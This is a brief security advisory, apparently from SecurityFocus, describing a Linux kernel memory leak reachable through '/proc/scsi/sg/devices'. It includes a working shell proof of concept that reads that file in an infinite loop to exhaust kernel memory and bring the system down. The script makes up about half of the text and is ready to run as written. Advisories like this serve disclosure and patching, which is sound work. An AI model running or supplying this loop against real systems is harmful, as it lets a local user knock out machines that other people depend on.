source: http://www.securityfocus.com/bid/14790/info

The Linux kernel is prone to a denial-of-service vulnerability. The kernel is affected by a memory leak, which eventually can result in a denial of service.

A local attacker can exploit this vulnerability by making repeated reads to the '/proc/scsi/sg/devices' file, which will exhaust kernel memory and lead to a denial of service. 

#!/bin/sh

while true; do
cat /proc/scsi/sg/devices > /dev/null
done 